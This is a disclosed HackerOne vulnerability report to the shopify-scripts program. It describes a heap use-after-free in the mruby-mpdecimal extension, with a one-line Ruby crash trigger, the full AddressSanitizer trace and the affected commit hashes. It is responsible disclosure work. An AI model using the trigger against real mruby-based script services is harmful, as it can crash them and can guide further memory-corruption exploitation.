# Use after free in mruby-mpdecimal

## Report Details
- **Report ID**: 244904
- **URL**: https://hackerone.com/reports/244904
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-06-30T23:18:43.925Z
- **Disclosed**: 2017-07-06T20:23:22.342Z

## Reporter
- **Username**: haquaman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Running the following ruby script in mruby compiled with ASAN enabled causes a use after free error:

```
x=inspect.to_d-0
```

Output of mruby with ASAN:

```
$ ./ext/enterprise_script_service/mruby/bin/mruby crash.rb
trace:
	[0] crash.rb:1
	[1] /root/ess/ext/enterprise_script_service/mruby-mpdecimal/mrblib/mpdecimal.rb:21:in to_d
/root/ess/ext/enterprise_script_service/mruby-mpdecimal/mrblib/mpdecimal.rb:21:can't convert "main" into Decimal (ArgumentError)
=================================================================
==8219==ERROR: AddressSanitizer: heap-use-after-free on address 0x60800000b9f0 at pc 0x00000073de47 bp 0x7ffc2a5efa90 sp 0x7ffc2a5efa88
READ of size 8 at 0x60800000b9f0 thread T0
    #0 0x73de46 in mpd_free /root/ess/ext/enterprise_script_service/mruby-mpdecimal/src/memory.c:139:5
    #1 0x6e0c15 in mpd_del /root/ess/ext/enterprise_script_service/mruby-mpdecimal/src/mpdecimal.c:459:9
    #2 0x6ddb62 in decimal_free /root/ess/ext/enterprise_script_service/mruby-mpdecimal/src/ext.c:28:3
    #3 0x536973 in obj_free /root/ess/ext/enterprise_script_service/mruby/src/gc.c:823:9
    #4 0x537055 in free_heap /root/ess/ext/enterprise_script_service/mruby/src/gc.c:388:9
    #5 0x537055 in mrb_gc_destroy /root/ess/ext/enterprise_script_service/mruby/src/gc.c:397
    #6 0x531d3d in mrb_close /root/ess/ext/enterprise_script_service/mruby/src/state.c:252:3
    #7 0x4e6c39 in cleanup /root/ess/ext/enterprise_script_service/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:165:3
    #8 0x4e6c39 in main /root/ess/ext/enterprise_script_service/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:257
    #9 0x7f2e96bdaf44 in __libc_start_main /build/eglibc-SvCtMH/eglibc-2.19/csu/libc-start.c:287
    #10 0x43f336 in _start (/root/ess/ext/enterprise_script_service/mruby/bin/mruby+0x43f336)

0x60800000b9f0 is located 80 bytes inside of 96-byte region [0x60800000b9a0,0x60800000ba00)
freed by thread T0 here:
    #0 0x4c6012 in free (/root/ess/ext/enterprise_script_service/mruby/bin/mruby+0x4c6012)
    #1 0x52fdd0 in mrb_default_allocf /root/ess/ext/enterprise_script_service/mruby/src/state.c:56:5

previously allocated by thread T0 here:
    #0 0x4c6635 in realloc (/root/ess/ext/enterprise_script_service/mruby/bin/mruby+0x4c6635)
    #1 0x52fdad in mrb_default_allocf /root/ess/ext/enterprise_script_service/mruby/src/state.c:60:12

SUMMARY: AddressSanitizer: heap-use-after-free /root/ess/ext/enterprise_script_service/mruby-mpdecimal/src/memory.c:139 mpd_free
Shadow bytes around the buggy address:
  0x0c107fff96e0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c107fff96f0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa
  0x0c107fff9700: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa
  0x0c107fff9710: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c107fff9720: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c107fff9730: fa fa fa fa fd fd fd fd fd fd fd fd fd fd[fd]fd
  0x0c107fff9740: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa
  0x0c107fff9750: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa
  0x0c107fff9760: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa
  0x0c107fff9770: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa
  0x0c107fff9780: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==8219==ABORTING
```

The version of mruby is:

```
 39779b339e12c81d2fd9dcc5d0a9c40bed965430 ext/enterprise_script_service/mruby (1.0.0-4080-g39779b3)
 ```

This is from the following commit in ess:

```
29ccd3691d8feabd37fe8872bd8d5c4e198531cf
```

I'll work on a patch this weekend hopefully.

## Attachments
No attachments
